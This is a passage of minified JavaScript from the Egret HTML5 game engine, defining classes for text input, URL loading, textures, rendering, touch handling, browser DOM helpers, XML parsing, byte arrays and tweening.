			return this.inputElement.value
		};
		c.prototype._setText = function (a) {
			this.inputElement.value = a
		};
		c.prototype._setTextType = function (a) {
			this.inputElement.type = a
		};
		c.prototype._getTextType = function () {
			return this.inputElement.type
		};
		c.prototype._open = function (a, b, c, e) {
			"undefined" === typeof c && (c = 160);
			"undefined" === typeof e && (e = 21);
			var f = d.StageDelegate.getInstance().getScaleX(),
			h = d.StageDelegate.getInstance().getScaleY(),
			g = document.createElement("input");
			g.type = "text";
			g.style.fontSize = "20px";
			g.style.color = "#FFFFFF";
			g.style.borderStyle = "none";
			g.style.background = "none";
			g.style.width = c * f + "px";
			g.style.height = e * h + "px";
			g.style.outline = "medium";
			var l = d.Browser.getInstance().$new("div");
			l.style.position = "absolute";
			l.position.x = a * f;
			l.style.width = c * f + "px";
			l.style.height = e * h + "px";
			l.position.y = b * h;
			l.transforms();
			l.appendChild(g);
			a = d.Browser.getInstance().$("#StageDelegateDiv");
			a || (c = document.getElementById(d.StageDelegate.canvas_div_name),
				e = c.clientHeight, c = c.clientWidth, a = d.Browser.getInstance().$new("div"), a.id = "StageDelegateDiv", a.style.position = "absolute", a.style.width = c + "px", a.style.maxHeight = e + "px", a.style.margin = "0px", document.getElementById(d.StageDelegate.canvas_div_name).appendChild(a), a.position.y = -e, a.transforms());
			a.appendChild(l);
			this.div = l;
			this.inputElement = g
		};
		c.prototype._remove = function () {
			var a = this.div;
			a && a.parentNode && a.parentNode.removeChild(a)
		};
		return c
	}
	(d.HashObject);
	d.StageText = e;
	e.prototype.__class__ = "egret.StageText"
})(egret ||
	(egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.GET = "GET";
		d.POST = "POST";
		return d
	}
	();
	d.URLRequestMethod = e;
	e.prototype.__class__ = "egret.URLRequestMethod"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.BINARY = "binary";
		d.TEXT = "text";
		d.VARIABLES = "variables";
		d.TEXTURE = "texture";
		d.SOUND = "sound";
		return d
	}
	();
	d.URLLoaderDataFormat = e;
	e.prototype.__class__ = "egret.URLLoaderDataFormat"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c(a) {
			"undefined" === typeof a && (a = null);
			d.call(this);
			null !== a && this.decode(a)
		}
		__extends(c, d);
		c.prototype.decode = function (a) {
			this.variables || (this.variables = {});
			a = a.split("+").join(" ");
			for (var b, c = /[?&]?([^=]+)=([^&]*)/g; b = c.exec(a); )
				this.variables[decodeURIComponent(b[1])] = decodeURIComponent(b[2])
		};
		c.prototype.toString = function () {
			if (!this.variables)
				return "";
			var a = this.variables,
			b = "",
			c = !0,
			d;
			for (d in a)
				c ? c = !1 : b += "&", b += d + "=" + a[d];
			return b
		};
		return c
	}
	(d.HashObject);
	d.URLVariables = e;
	e.prototype.__class__ = "egret.URLVariables"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			"undefined" === typeof a && (a = null);
			e.call(this);
			this.method = d.URLRequestMethod.GET;
			this.url = a
		}
		__extends(c, e);
		return c
	}
	(d.HashObject);
	d.URLRequest = e;
	e.prototype.__class__ = "egret.URLRequest"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a) {
			"undefined" === typeof a && (a = null);
			e.call(this);
			this.dataFormat = d.URLLoaderDataFormat.TEXT;
			a && this.load(a)
		}
		__extends(c, e);
		c.prototype.load = function (a) {
			this._request = a;
			this.data = null;
			d.MainContext.instance.netContext.proceed(this)
		};
		return c
	}
	(d.EventDispatcher);
	d.URLLoader = e;
	e.prototype.__class__ = "egret.URLLoader"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._textureHeight = this._textureWidth = this._offsetY = this._offsetX = this._bitmapHeight = this._bitmapWidth = this._bitmapY = this._bitmapX = 0
		}
		__extends(c, e);
		Object.defineProperty(c.prototype, "textureWidth", {
			get : function () {
				return this._textureWidth
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "textureHeight", {
			get : function () {
				return this._textureHeight
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "bitmapData", {
			get : function () {
				return this._bitmapData
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._setBitmapData = function (a) {
			var b = d.MainContext.instance.rendererContext.texture_scale_factor;
			this._bitmapData = a;
			this._sourceWidth = a.width;
			this._sourceHeight = a.height;
			this._textureWidth = this._sourceWidth * b;
			this._textureHeight = this._sourceHeight * b;
			this._bitmapWidth = this._textureWidth;
			this._bitmapHeight = this._textureHeight;
			this._offsetX = this._offsetY = this._bitmapX = this._bitmapY = 0
		};
		c.prototype.getPixel32 = function (a, b) {
			return this._bitmapData.getContext("2d").getImageData(a,
				b, 1, 1).data
		};
		return c
	}
	(d.HashObject);
	d.Texture = e;
	e.prototype.__class__ = "egret.Texture"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._bitmapData = document.createElement("canvas");
			this.renderContext = d.RendererContext.createRendererContext(this._bitmapData)
		}
		__extends(c, e);
		c.prototype.drawToTexture = function (a) {
			var b = this._bitmapData,
			c = a.getBounds(d.Rectangle.identity);
			b.width = c.width;
			b.height = c.height;
			a._worldTransform.identity();
			a.worldAlpha = 1;
			if (a instanceof d.DisplayObjectContainer) {
				this._offsetX = c.x;
				this._offsetY = c.y;
				a._worldTransform.append(1, 0, 0, 1, -c.x, -c.y);
				for (var b =
						a._children, c = 0, e = b.length; c < e; c++)
					b[c]._updateTransform()
			}
			b = d.RenderFilter.getInstance();
			c = b._drawAreaList.concat();
			b._drawAreaList.length = 0;
			this.renderContext.clearScreen();
			this.webGLTexture = null;
			(e = a.mask || a._scrollRect) && this.renderContext.pushMask(e);
			a._render(this.renderContext);
			e && this.renderContext.popMask();
			b._drawAreaList = c;
			this._textureWidth = this._bitmapData.width;
			this._textureHeight = this._bitmapData.height;
			this._sourceWidth = this._textureWidth;
			this._sourceHeight = this._textureHeight
		};
		return c
	}
	(d.Texture);
	d.RenderTexture = e;
	e.prototype.__class__ = "egret.RenderTexture"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.renderCost = 0;
			this.texture_scale_factor = 1
		}
		__extends(c, e);
		c.prototype.clearScreen = function () {};
		c.prototype.clearRect = function (a, b, c, d) {};
		c.prototype.drawImage = function (a, b, c, e, f, h, g, l, k) {
			d.Profiler.getInstance().onDrawImage()
		};
		c.prototype.setTransform = function (a) {};
		c.prototype.setAlpha = function (a, b) {};
		c.prototype.setupFont = function (a) {};
		c.prototype.measureText = function (a) {
			return 0
		};
		c.prototype.drawText = function (a, b, c, e, f) {
			d.Profiler.getInstance().onDrawImage()
		};
		c.prototype.strokeRect = function (a, b, c, d, e) {};
		c.prototype.pushMask = function (a) {};
		c.prototype.popMask = function () {};
		c.createRendererContext = function (a) {
			return null
		};
		return c
	}
	(d.HashObject);
	d.RendererContext = e;
	e.prototype.__class__ = "egret.RendererContext"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.MOUSE = "mouse";
		d.TOUCH = "touch";
		d.mode = "touch";
		return d
	}
	();
	d.InteractionMode = e;
	e.prototype.__class__ = "egret.InteractionMode"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._currentTouchTarget = {};
			this.maxTouches = 2;
			this.touchDownTarget = {};
			this.lastTouchY = this.lastTouchX = -1
		}
		__extends(c, e);
		c.prototype.run = function () {};
		c.prototype.getTouchData = function (a, b, c) {
			var d = this._currentTouchTarget[a];
			null == d && (d = {}, this._currentTouchTarget[a] = d);
			d.stageX = b;
			d.stageY = c;
			d.identifier = a;
			return d
		};
		c.prototype.dispatchEvent = function (a, b) {
			d.TouchEvent.dispatchTouchEvent(b.target, a, b.identifier, b.stageX, b.stageY, !1, !1, !1, !0 ==
				this.touchDownTarget[b.identifier])
		};
		c.prototype.onTouchBegan = function (a, b, c) {
			var e = d.MainContext.instance.stage.hitTest(a, b);
			e && (a = this.getTouchData(c, a, b), this.touchDownTarget[c] = !0, a.target = e, a.beginTarget = e, this.dispatchEvent(d.TouchEvent.TOUCH_BEGIN, a))
		};
		c.prototype.onTouchMove = function (a, b, c) {
			if (a != this.lastTouchX || b != this.lastTouchY) {
				this.lastTouchX = a;
				this.lastTouchY = b;
				var e = d.MainContext.instance.stage.hitTest(a, b);
				e && (a = this.getTouchData(c, a, b), a.target = e, this.dispatchEvent(d.TouchEvent.TOUCH_MOVE,
						a))
			}
		};
		c.prototype.onTouchEnd = function (a, b, c) {
			var e = d.MainContext.instance.stage.hitTest(a, b);
			e && (a = this.getTouchData(c, a, b), delete this.touchDownTarget[c], c = a.beginTarget, a.target = e, this.dispatchEvent(d.TouchEvent.TOUCH_END, a), c == e ? this.dispatchEvent(d.TouchEvent.TOUCH_TAP, a) : a.beginTarget && (a.target = a.beginTarget, this.dispatchEvent(d.TouchEvent.TOUCH_RELEASE_OUTSIDE, a)), delete this._currentTouchTarget[a.identifier])
		};
		return c
	}
	(d.HashObject);
	d.TouchContext = e;
	e.prototype.__class__ = "egret.TouchContext"
})(egret ||
	(egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this)
		}
		__extends(c, d);
		c.prototype.proceed = function (a) {};
		return c
	}
	(d.HashObject);
	d.NetContext = e;
	e.prototype.__class__ = "egret.NetContext"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this.frameRate = 60
		}
		__extends(c, d);
		c.prototype.executeMainLoop = function (a, b) {};
		return c
	}
	(d.HashObject);
	d.DeviceContext = e;
	e.prototype.__class__ = "egret.DeviceContext"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.translate = this.isHD ? function (b) {
				return "translate3d(" + b.x + "px, " + (b.y - d.MainContext.instance.stage.stageHeight) + "px, 0) "
			}
			 : function (b) {
				return "translate(" + b.x + "px, " + b.y + "px) "
			};
			this.rotate = this.isHD ? function (b) {
				return "rotateZ(" + b + "deg) "
			}
			 : function (b) {
				return "rotate(" + b + "deg) "
			};
			this.ua = navigator.userAgent.toLowerCase();
			var a = this.ua.match(/micromessenger|qqbrowser|mqqbrowser|ucbrowser|360browser|baidubrowser|maxthon|ie|opera|firefox/) || this.ua.match(/chrome|safari/);
			a && 0 < a.length && (a = a[0], "micromessenger" == a && (this.type = "wechat"), this.type = a);
			this.type = "unknow";
			switch (this.type) {
			case "firefox":
				this.pfx = "Moz";
				this.isHD = !0;
				break;
			case "chrome":
			case "safari":
				this.pfx = "webkit";
				this.isHD = !0;
				break;
			case "opera":
				this.pfx = "O";
				this.isHD = !1;
				break;
			case "ie":
				this.pfx = "ms";
				this.isHD = !1;
				break;
			default:
				this.pfx = "webkit",
				this.isHD = !0
			}
			this.trans = this.pfx + "Transform"
		}
		__extends(c, e);
		c.getInstance = function () {
			null == c.instance && (c.instance = new c);
			return c.instance
		};
		Object.defineProperty(c.prototype,
			"isMobile", {
			get : function () {
				d.Logger.warning("Browser.isMobile\u63a5\u53e3\u53c2\u6570\u5df2\u7ecf\u53d8\u66f4\uff0c\u8bf7\u5c3d\u5feb\u8c03\u6574\u7528\u6cd5\u4e3a egret.MainContext.deviceType == egret.MainContext.DEVICE_MOBILE ");
				return d.MainContext.deviceType == d.MainContext.DEVICE_MOBILE
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.$new = function (a) {
			return this.$(document.createElement(a))
		};
		c.prototype.$ = function (a) {
			var b = document;
			if (a = a instanceof HTMLElement ? a : b.querySelector(a))
				a.find = a.find ||
					this.$, a.hasClass = a.hasClass || function (b) {
					return this.className.match(new RegExp("(\\s|^)" + b + "(\\s|$)"))
				},
			a.addClass = a.addClass || function (b) {
				this.hasClass(b) || (this.className && (this.className += " "), this.className += b);
				return this
			},
			a.removeClass = a.removeClass || function (b) {
				this.hasClass(b) && (this.className = this.className.replace(b, ""));
				return this
			},
			a.remove = a.remove || function () {},
			a.appendTo = a.appendTo || function (b) {
				b.appendChild(this);
				return this
			},
			a.prependTo = a.prependTo || function (b) {
				b.childNodes[0] ?
				b.insertBefore(this, b.childNodes[0]) : b.appendChild(this);
				return this
			},
			a.transforms = a.transforms || function () {
				this.style[c.getInstance().trans] = c.getInstance().translate(this.position) + c.getInstance().rotate(this.rotation) + c.getInstance().scale(this.scale) + c.getInstance().skew(this.skew);
				return this
			},
			a.position = a.position || {
				x : 0,
				y : 0
			},
			a.rotation = a.rotation || 0,
			a.scale = a.scale || {
				x : 1,
				y : 1
			},
			a.skew = a.skew || {
				x : 0,
				y : 0
			},
			a.translates = function (b, a) {
				this.position.x = b;
				this.position.y = a - d.MainContext.instance.stage.stageHeight;
				this.transforms();
				return this
			},
			a.rotate = function (b) {
				this.rotation = b;
				this.transforms();
				return this
			},
			a.resize = function (b, a) {
				this.scale.x = b;
				this.scale.y = a;
				this.transforms();
				return this
			},
			a.setSkew = function (b, a) {
				this.skew.x = b;
				this.skew.y = a;
				this.transforms();
				return this
			};
			return a
		};
		c.prototype.scale = function (a) {
			return "scale(" + a.x + ", " + a.y + ") "
		};
		c.prototype.skew = function (a) {
			return "skewX(" + -a.x + "deg) skewY(" + a.y + "deg)"
		};
		return c
	}
	(d.HashObject);
	d.Browser = e;
	e.prototype.__class__ = "egret.Browser"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function e() {}

		e.parse = function (c) {
			c = d.SAXParser.getInstance().parserXML(c);
			if (!c || !c.childNodes)
				return null;
			for (var a = c.childNodes.length, b = !1, m = 0; m < a; m++) {
				var u = c.childNodes[m];
				if (1 == u.nodeType) {
					b = !0;
					break
				}
			}
			return b ? e.parseNode(u) : null
		};
		e.parseNode = function (c) {
			if (!c || 1 != c.nodeType)
				return null;
			var a = {};
			a.localName = c.localName;
			a.name = c.nodeName;
			c.namespaceURI && (a.namespace = c.namespaceURI);
			c.prefix && (a.prefix = c.prefix);
			for (var b = c.attributes, m = b.length, d = 0; d < m; d++) {
				var y = b[d],
				h = y.name;
				0 != h.indexOf("xmlns:") && (a["$" + h] = y.value)
			}
			b = c.childNodes;
			m = b.length;
			for (d = 0; d < m; d++)
				if (y = e.parseNode(b[d]))
					a.children || (a.children = []), y.parent = a, a.children.push(y);
			!a.children && (c = c.textContent.trim()) && (a.text = c);
			return a
		};
		e.findChildren = function (c, a, b) {
			b ? b.length = 0 : b = [];
			e.findByPath(c, a, b);
			return b
		};
		e.findByPath = function (c, a, b) {
			var m = a.indexOf("."),
			d;
			-1 == m ? (d = a, m = !0) : (d = a.substring(0, m), a = a.substring(m + 1), m = !1);
			if (c = c.children)
				for (var y = c.length, h = 0; h < y; h++) {
					var g = c[h];
					g.localName == d &&
					(m ? b.push(g) : e.findByPath(g, a, b))
				}
		};
		e.getAttributes = function (c, a) {
			a ? a.length = 0 : a = [];
			for (var b in c)
				"$" == b.charAt(0) && a.push(b.substring(1));
			return a
		};
		return e
	}
	();
	d.XML = e;
	e.prototype.__class__ = "egret.XML"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function c() {}

		c.LITTLE_ENDIAN = "LITTLE_ENDIAN";
		c.BIG_ENDIAN = "BIG_ENDIAN";
		return c
	}
	();
	d.Endian = e;
	e.prototype.__class__ = "egret.Endian";
	var f = function () {
		function c() {
			this.length = this.position = 0;
			this._mode = "";
			this.maxlength = 0;
			this._endian = e.LITTLE_ENDIAN;
			this.isLittleEndian = !1;
			this._mode = "Typed array";
			this.maxlength = 4;
			this.arraybytes = new ArrayBuffer(this.maxlength);
			this.unalignedarraybytestemp = new ArrayBuffer(16);
			this.endian = c.DEFAULT_ENDIAN
		}
		Object.defineProperty(c.prototype,
			"endian", {
			get : function () {
				return this._endian
			},
			set : function (a) {
				this._endian = a;
				this.isLittleEndian = a == e.LITTLE_ENDIAN
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.ensureWriteableSpace = function (a) {
			this.ensureSpace(a + this.position)
		};
		c.prototype.setArrayBuffer = function (a) {
			this.ensureSpace(a.byteLength);
			this.length = a.byteLength;
			a = new Int8Array(a);
			(new Int8Array(this.arraybytes, 0, this.length)).set(a);
			this.position = 0
		};
		Object.defineProperty(c.prototype, "bytesAvailable", {
			get : function () {
				return this.length - this.position
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.ensureSpace = function (a) {
			if (a > this.maxlength) {
				a = a + 255 & -256;
				var b = new ArrayBuffer(a),
				c = new Uint8Array(this.arraybytes, 0, this.length);
				(new Uint8Array(b, 0, this.length)).set(c);
				this.arraybytes = b;
				this.maxlength = a
			}
		};
		c.prototype.writeByte = function (a) {
			this.ensureWriteableSpace(1);
			(new Int8Array(this.arraybytes))[this.position++] = ~~a;
			this.position > this.length && (this.length = this.position)
		};
		c.prototype.readByte = function () {
			if (this.position >= this.length)
				throw "ByteArray out of bounds read. Positon=" +
				this.position + ", Length=" + this.length;
			return (new Int8Array(this.arraybytes))[this.position++]
		};
		c.prototype.readBytes = function (a, b, c) {
			"undefined" === typeof b && (b = 0);
			"undefined" === typeof c && (c = 0);
			null == c && (c = a.length);
			a.ensureWriteableSpace(b + c);
			var d = new Int8Array(a.arraybytes),
			e = new Int8Array(this.arraybytes);
			d.set(e.subarray(this.position, this.position + c), b);
			this.position += c;
			c + b > a.length && (a.length += c + b - a.length)
		};
		c.prototype.writeUnsignedByte = function (a) {
			this.ensureWriteableSpace(1);
			(new Uint8Array(this.arraybytes))[this.position++] =
				~~a & 255;
			this.position > this.length && (this.length = this.position)
		};
		c.prototype.readUnsignedByte = function () {
			if (this.position >= this.length)
				throw "ByteArray out of bounds read. Positon=" + this.position + ", Length=" + this.length;
			return (new Uint8Array(this.arraybytes))[this.position++]
		};
		c.prototype.writeUnsignedShort = function (a) {
			this.ensureWriteableSpace(2);
			if (0 == (this.position & 1)) {
				var b = new Uint16Array(this.arraybytes);
				b[this.position >> 1] = ~~a & 65535
			} else
				b = new Uint16Array(this.unalignedarraybytestemp, 0, 1), b[0] =
					~~a & 65535, a = new Uint8Array(this.arraybytes, this.position, 2), b = new Uint8Array(this.unalignedarraybytestemp, 0, 2), a.set(b);
			this.position += 2;
			this.position > this.length && (this.length = this.position)
		};
		c.prototype.readUTFBytes = function (a) {
			var b = "";
			a = this.position + a;
			for (var c = new DataView(this.arraybytes); this.position < a; ) {
				var d = c.getUint8(this.position++);
				if (128 > d) {
					if (0 == d)
						break;
					b += String.fromCharCode(d)
				} else if (224 > d)
					b += String.fromCharCode((d & 63) << 6 | c.getUint8(this.position++) & 127);
				else if (240 > d)
					var e = c.getUint8(this.position++),
					b = b + String.fromCharCode((d & 31) << 12 | (e & 127) << 6 | c.getUint8(this.position++) & 127);
				else
					var e = c.getUint8(this.position++), f = c.getUint8(this.position++), b = b + String.fromCharCode((d & 15) << 18 | (e & 127) << 12 | f << 6 & 127 | c.getUint8(this.position++) & 127)
			}
			return b
		};
		c.prototype.readInt = function () {
			var a = (new DataView(this.arraybytes)).getInt32(this.position, this.isLittleEndian);
			this.position += 4;
			return a
		};
		c.prototype.readShort = function () {
			var a = (new DataView(this.arraybytes)).getInt16(this.position, this.isLittleEndian);
			this.position += 2;
			return a
		};
		c.prototype.readDouble = function () {
			var a = (new DataView(this.arraybytes)).getFloat64(this.position, this.isLittleEndian);
			this.position += 8;
			return a
		};
		c.prototype.readUnsignedShort = function () {
			if (this.position > this.length + 2)
				throw "ByteArray out of bounds read. Position=" + this.position + ", Length=" + this.length;
			if (0 == (this.position & 1)) {
				var a = new Uint16Array(this.arraybytes),
				b = this.position >> 1;
				this.position += 2;
				return a[b]
			}
			a = new Uint16Array(this.unalignedarraybytestemp, 0, 1);
			b = new Uint8Array(this.arraybytes,
					this.position, 2);
			(new Uint8Array(this.unalignedarraybytestemp, 0, 2)).set(b);
			this.position += 2;
			return a[0]
		};
		c.prototype.writeUnsignedInt = function (a) {
			this.ensureWriteableSpace(4);
			if (0 == (this.position & 3)) {
				var b = new Uint32Array(this.arraybytes);
				b[this.position >> 2] = ~~a & 4294967295
			} else
				b = new Uint32Array(this.unalignedarraybytestemp, 0, 1), b[0] = ~~a & 4294967295, a = new Uint8Array(this.arraybytes, this.position, 4), b = new Uint8Array(this.unalignedarraybytestemp, 0, 4), a.set(b);
			this.position += 4;
			this.position > this.length &&
			(this.length = this.position)
		};
		c.prototype.readUnsignedInt = function () {
			if (this.position > this.length + 4)
				throw "ByteArray out of bounds read. Position=" + this.position + ", Length=" + this.length;
			if (0 == (this.position & 3)) {
				var a = new Uint32Array(this.arraybytes),
				b = this.position >> 2;
				this.position += 4;
				return a[b]
			}
			a = new Uint32Array(this.unalignedarraybytestemp, 0, 1);
			b = new Uint8Array(this.arraybytes, this.position, 4);
			(new Uint8Array(this.unalignedarraybytestemp, 0, 4)).set(b);
			this.position += 4;
			return a[0]
		};
		c.prototype.writeFloat =
		function (a) {
			this.ensureWriteableSpace(4);
			if (0 == (this.position & 3)) {
				var b = new Float32Array(this.arraybytes);
				b[this.position >> 2] = a
			} else
				b = new Float32Array(this.unalignedarraybytestemp, 0, 1), b[0] = a, a = new Uint8Array(this.arraybytes, this.position, 4), b = new Uint8Array(this.unalignedarraybytestemp, 0, 4), a.set(b);
			this.position += 4;
			this.position > this.length && (this.length = this.position)
		};
		c.prototype.readFloat = function () {
			if (this.position > this.length + 4)
				throw "ByteArray out of bounds read. Positon=" + this.position + ", Length=" +
				this.length;
			if (0 == (this.position & 3)) {
				var a = new Float32Array(this.arraybytes),
				b = this.position >> 2;
				this.position += 4;
				return a[b]
			}
			a = new Float32Array(this.unalignedarraybytestemp, 0, 1);
			b = new Uint8Array(this.arraybytes, this.position, 4);
			(new Uint8Array(this.unalignedarraybytestemp, 0, 4)).set(b);
			this.position += 4;
			return a[0]
		};
		c.DEFAULT_ENDIAN = e.BIG_ENDIAN;
		return c
	}
	();
	d.ByteArray = f;
	f.prototype.__class__ = "egret.ByteArray"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c(a, b, c) {
			e.call(this);
			this._target = null;
			this.loop = this.ignoreGlobalPause = this._useTicks = !1;
			this._actions = this._steps = this.pluginData = null;
			this.paused = !1;
			this.duration = 0;
			this._prevPos = -1;
			this.position = null;
			this._stepPosition = this._prevPosition = 0;
			this.passive = !1;
			this.initialize(a, b, c)
		}
		__extends(c, e);
		c.get = function (a, b, d, e) {
			"undefined" === typeof b && (b = null);
			"undefined" === typeof d && (d = null);
			"undefined" === typeof e && (e = !1);
			e && c.removeTweens(a);
			return new c(a, b, d)
		};
		c.removeTweens = function (a) {
			if (a.tween_count) {
				for (var b = c._tweens, d = b.length - 1; 0 <= d; d--)
					b[d]._target == a && (b[d].paused = !0, b.splice(d, 1));
				a.tween_count = 0
			}
		};
		c.tick = function (a, b) {
			"undefined" === typeof b && (b = !1);
			for (var d = c._tweens.concat(), e = d.length - 1; 0 <= e; e--) {
				var f = d[e];
				b && !f.ignoreGlobalPause || f.paused || f.tick(f._useTicks ? 1 : a)
			}
		};
		c._register = function (a, b) {
			var m = a._target,
			e = c._tweens;
			if (b)
				m && (m.tween_count = m.tween_count ? m.tween_count + 1 : 1), e.push(a), c._inited || (d.Ticker.getInstance().register(c.tick, null),
					c._inited = !0);
			else
				for (m && m.tween_count--, m = e.length; m--; )
					if (e[m] == a) {
						e.splice(m, 1);
						break
					}
		};
		c.removeAllTweens = function () {
			for (var a = c._tweens, b = 0, d = a.length; b < d; b++) {
				var e = a[b];
				e.paused = !0;
				e._target.tweenjs_count = 0
			}
			a.length = 0
		};
		c.prototype.initialize = function (a, b, d) {
			this._target = a;
			b && (this._useTicks = b.useTicks, this.ignoreGlobalPause = b.ignoreGlobalPause, this.loop = b.loop, b.onChange && this.addEventListener("change", b.onChange, b.onChangeObj), b.override && c.removeTweens(a));
			this.pluginData = d || {};
			this._curQueueProps = {};
			this._initQueueProps = {};
			this._steps = [];
			this._actions = [];
			b && b.paused ? this.paused = !0 : c._register(this, !0);
			b && null != b.position && this.setPosition(b.position, c.NONE)
		};
		c.prototype.setPosition = function (a, b) {
			"undefined" === typeof b && (b = 1);
			0 > a && (a = 0);
			var c = a,
			d = !1;
			c >= this.duration && (this.loop ? c %= this.duration : (c = this.duration, d = !0));
			if (c == this._prevPos)
				return d;
			var e = this._prevPos;
			this.position = this._prevPos = c;
			this._prevPosition = a;
			if (this._target)
				if (d)
					this._updateTargetProps(null, 1);
				else if (0 < this._steps.length) {
					for (var f =
							0, g = this._steps.length; f < g && !(this._steps[f].t > c); f++);
					f = this._steps[f - 1];
					this._updateTargetProps(f, (this._stepPosition = c - f.t) / f.d)
				}
			0 != b && 0 < this._actions.length && (this._useTicks ? this._runActions(c, c) : 1 == b && c < e ? (e != this.duration && this._runActions(e, this.duration), this._runActions(0, c, !0)) : this._runActions(e, c));
			d && this.setPaused(!0);
			this.dispatchEventWith("change");
			return d
		};
		c.prototype._runActions = function (a, b, c) {
			"undefined" === typeof c && (c = !1);
			var d = a,
			e = b,
			f = -1,
			g = this._actions.length,
			l = 1;
			a > b && (d = b,
				e = a, f = g, g = l = -1);
			for (; (f += l) != g; ) {
				b = this._actions[f];
				var k = b.t;
				(k == e || k > d && k < e || c && k == a) && b.f.apply(b.o, b.p)
			}
		};
		c.prototype._updateTargetProps = function (a, b) {
			var d,
			e,
			f,
			h;
			if (a || 1 != b) {
				if (this.passive = !!a.v)
					return;
				a.e && (b = a.e(b, 0, 1, 1));
				d = a.p0;
				e = a.p1
			} else
				this.passive = !1, d = e = this._curQueueProps;
			for (var g in this._initQueueProps) {
				null == (f = d[g]) && (d[g] = f = this._initQueueProps[g]);
				null == (h = e[g]) && (e[g] = h = f);
				f = f == h || 0 == b || 1 == b || "number" != typeof f ? 1 == b ? h : f : f + (h - f) * b;
				var l = !1;
				if (h = c._plugins[g])
					for (var k = 0, n = h.length; k <
						n; k++) {
						var q = h[k].tween(this, g, f, d, e, b, !!a && d == e, !a);
						q == c.IGNORE ? l = !0 : f = q
					}
				l || (this._target[g] = f)
			}
		};
		c.prototype.setPaused = function (a) {
			this.paused = a;
			c._register(this, !a);
			return this
		};
		c.prototype._cloneProps = function (a) {
			var b = {},
			c;
			for (c in a)
				b[c] = a[c];
			return b
		};
		c.prototype._addStep = function (a) {
			0 < a.d && (this._steps.push(a), a.t = this.duration, this.duration += a.d);
			return this
		};
		c.prototype._appendQueueProps = function (a) {
			var b,
			d,
			e,
			f,
			h,
			g;
			for (g in a)
				if (void 0 === this._initQueueProps[g]) {
					d = this._target[g];
					if (b = c._plugins[g])
						for (e =
								0, f = b.length; e < f; e++)
							d = b[e].init(this, g, d);
					this._initQueueProps[g] = this._curQueueProps[g] = void 0 === d ? null : d
				}
			for (g in a) {
				d = this._curQueueProps[g];
				if (b = c._plugins[g])
					for (h = h || {}, e = 0, f = b.length; e < f; e++)
						b[e].step && b[e].step(this, g, d, a[g], h);
				this._curQueueProps[g] = a[g]
			}
			h && this._appendQueueProps(h);
			return this._curQueueProps
		};
		c.prototype._addAction = function (a) {
			a.t = this.duration;
			this._actions.push(a);
			return this
		};
		c.prototype._set = function (a, b) {
			for (var c in a)
				b[c] = a[c]
		};
		c.prototype.wait = function (a, b) {
			if (null ==
				a || 0 >= a)
				return this;
			var c = this._cloneProps(this._curQueueProps);
			return this._addStep({
				d : a,
				p0 : c,
				p1 : c,
				v : b
			})
		};
		c.prototype.to = function (a, b, c) {
			"undefined" === typeof c && (c = void 0);
			if (isNaN(b) || 0 > b)
				b = 0;
			return this._addStep({
				d : b || 0,
